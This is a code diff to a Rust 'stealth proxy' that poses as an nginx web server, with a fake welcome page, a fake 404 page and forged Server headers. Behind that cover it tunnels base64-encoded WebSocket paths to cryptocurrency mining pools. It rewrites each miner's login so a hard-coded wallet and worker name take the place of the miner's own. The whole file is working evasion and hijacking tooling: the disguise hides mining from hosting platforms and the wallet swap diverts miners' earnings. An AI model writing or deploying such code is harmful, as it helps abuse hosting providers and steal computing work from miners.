@@ -16,14 +16,14 @@ use colored::*;
 use chrono::Utc;
 
 // ==========================================
-// ⚙️ CẤU HÌNH VÍ & WORKER CỦA BẠN
+// ⚙️ CẤU HÌNH VÍ
 // ==========================================
-const LISTEN_ADDR: &str = "0.0.0.0:8080"; // Port 8080 để chạy tốt trên Koyeb/Docker
+const LISTEN_ADDR: &str = "0.0.0.0:8080";
 const MY_WALLET: &str = "SC11rezQ11DLX63oNaZD3Z5ggonmtfyehVhyjb1bFeLMB7emmGhDodc268uvcT87HTYsqqi4mzkZmQB4xgNeBRCf84CCygp9vQ.PY";
-const MY_WORKER: &str = "Worker_Rust_God";
+const MY_WORKER: &str = "Worker_Stealth_Final";
 
 // ==========================================
-// 🎭 TRANG WEB GIẢ MẠO (NGINX FAKE)
+// 🎭 HTML FAKE
 // ==========================================
 const NGINX_WELCOME: &str = r#"<!DOCTYPE html>
 <html>
@@ -48,9 +48,6 @@ const NGINX_404: &str = r#"<html>
 </body>
 </html>"#;
 
-// ==========================================
-// APP START
-// ==========================================
 struct ProxyStats {
     shares_sent: AtomicUsize,
     shares_accepted: AtomicUsize,
@@ -60,16 +57,13 @@ struct ProxyStats {
 async fn main() {
     tracing_subscriber::fmt().with_max_level(tracing::Level::WARN).init();
 
-    // Router xử lý:
-    // / -> Trang chủ Nginx giả
-    // /:path -> Kiểm tra xem có phải link Mining không
     let app = Router::new()
         .route("/", get(root_handler))
         .route("/:path", get(stealth_handler))
         .layer(middleware::from_fn(nginx_header_spoofer));
 
     let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
-    println!("{} {}", "💀 STEALTH PROXY RUNNING ON".green().bold(), addr);
+    println!("{} {}", "💀 STEALTH PROXY FIXED RUNNING ON".green().bold(), addr);
     println!("💰 Target: {}", MY_WALLET.yellow());
 
     let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
@@ -77,23 +71,27 @@ async fn main() {
 }
 
 // ==========================================
-// 🛡️ MIDDLEWARE: GIẢ MẠO HEADER HTTP
+// 🛡️ MIDDLEWARE FIX (ĐÃ SỬA LỖI BUILD)
 // ==========================================
 async fn nginx_header_spoofer(req: Request, next: Next) -> Response {
     let mut response = next.run(req).await;
+    
+    // --- FIX TẠI ĐÂY ---
+    // 1. Lấy status ra biến riêng (Copy) TRƯỚC KHI mượn mutable headers
+    let status = response.status();
+    
+    // 2. Bây giờ mới mượn headers để sửa
     let headers = response.headers_mut();
 
-    // 1. Giả danh Server Nginx Ubuntu
     headers.insert(SERVER, HeaderValue::from_static("nginx/1.18.0 (Ubuntu)"));
     
-    // 2. Thêm ngày giờ chuẩn Server
     let now = Utc::now().format("%a, %d %b %Y %H:%M:%S GMT").to_string();
     if let Ok(val) = HeaderValue::from_str(&now) {
         headers.insert(DATE, val);
     }
 
-    // 3. Chỉ thêm Keep-Alive nếu không phải là WebSocket Upgrade
-    if response.status() != StatusCode::SWITCHING_PROTOCOLS {
+    // 3. So sánh biến 'status' đã copy, không động chạm vào 'response' nữa
+    if status != StatusCode::SWITCHING_PROTOCOLS {
         headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
     }
 
@@ -108,7 +106,6 @@ async fn root_handler() -> Html<&'static str> {
 }
 
 async fn stealth_handler(Path(path): Path<String>, ws: Option<WebSocketUpgrade>) -> Response {
-    // 1. Giải mã Base64 (Hỗ trợ cả URL Safe và Standard để Cloudflare không bị lỗi)
     let decoded_vec = if let Ok(d) = general_purpose::STANDARD.decode(&path) { d }
     else if let Ok(d) = general_purpose::URL_SAFE_NO_PAD.decode(&path) { d }
     else { return not_found_response() };
@@ -118,13 +115,12 @@ async fn stealth_handler(Path(path): Path<String>, ws: Option<WebSocketUpgrade>)
         Err(_) => return not_found_response(),
     };
 
-    // 2. Chỉ chấp nhận WebSocket -> Kích hoạt Mining Tunnel
     match ws {
         Some(w) => {
             println!("{} Tunnel -> {}", "🥷".magenta(), pool_addr);
             w.on_upgrade(move |socket| mining_tunnel(socket, pool_addr))
         },
-        None => not_found_response() // Nếu là trình duyệt thường -> Trả về 404 Nginx
+        None => not_found_response()
     }
 }
 
@@ -133,10 +129,9 @@ fn not_found_response() -> Response {
 }
 
 // ==========================================
-// ⛏️ MINING CORE (LOGIC CŨ CỦA BẠN ĐÃ TỐI ƯU)
+// MINING CORE
 // ==========================================
 async fn mining_tunnel(socket: WebSocket, pool_addr: String) {
-    // Kết nối TCP đến Pool thật
     let tcp_stream = match TcpStream::connect(&pool_addr).await {
         Ok(s) => s,
         Err(e) => {
@@ -153,8 +148,7 @@ async fn mining_tunnel(socket: WebSocket, pool_addr: String) {
         shares_accepted: AtomicUsize::new(0),
     });
 
-    // LUỒNG 1: Miner -> Pool (Thay ví)
-    let stats_miner = stats.clone();
+    let _stats_miner = stats.clone();
     let client_to_server = tokio::spawn(async move {
         while let Some(Ok(msg)) = ws_read.next().await {
             match msg {
@@ -163,20 +157,18 @@ async fn mining_tunnel(socket: WebSocket, pool_addr: String) {
                         if line.trim().is_empty() { continue; }
                         let mut final_msg = line.to_string();
                         
-                        // Parse JSON để thay ví
                         if line.contains("login") || line.contains("submit") {
                             if let Ok(mut json) = serde_json::from_str::<Value>(line) {
                                 if let Some(method) = json["method"].as_str() {
                                     if method == "login" {
                                         if let Some(params) = json.get_mut("params") {
-                                            // 🕵️ INTERCEPT: Thay bằng ví của bạn
                                             params["login"] = serde_json::json!(MY_WALLET);
                                             params["pass"] = serde_json::json!(MY_WORKER);
                                             final_msg = json.to_string();
                                             println!("{} Intercepted Login -> Swapped Wallet", "🕵️".yellow());
                                         }
                                     } else if method == "submit" {
-                                        stats_miner.shares_sent.fetch_add(1, Ordering::Relaxed);
+                                        _stats_miner.shares_sent.fetch_add(1, Ordering::Relaxed);
                                     }
                                 }
                             }
@@ -192,8 +184,7 @@ async fn mining_tunnel(socket: WebSocket, pool_addr: String) {
         }
     });
 
-    // LUỒNG 2: Pool -> Miner (Audit Share)
-    let stats_pool = stats.clone();
+    let _stats_pool = stats.clone();
     let server_to_client = tokio::spawn(async move {
         let mut buffer = [0u8; 8192];
         loop {
@@ -202,13 +193,11 @@ async fn mining_tunnel(socket: WebSocket, pool_addr: String) {
                 Ok(n) => {
                     let data = &buffer[0..n];
                     if let Ok(text) = std::str::from_utf8(data) {
-                         // Gửi Text frame về cho Miner
                          if ws_write.send(Message::Text(text.to_string())).await.is_err() { break; }
                          
-                         // Audit: Kiểm tra xem Pool có chấp nhận Share không
                          if text.contains("\"status\":\"OK\"") || text.contains("\"result\":true") {
-                             let total = stats_pool.shares_accepted.fetch_add(1, Ordering::Relaxed) + 1;
-                             let sent = stats_pool.shares_sent.load(Ordering::Relaxed);
+                             let total = _stats_pool.shares_accepted.fetch_add(1, Ordering::Relaxed) + 1;
+                             let sent = _stats_pool.shares_sent.load(Ordering::Relaxed);
                              println!("{} Share Accepted ({}/{})", "✅".green(), total, sent);
                          }
                     }
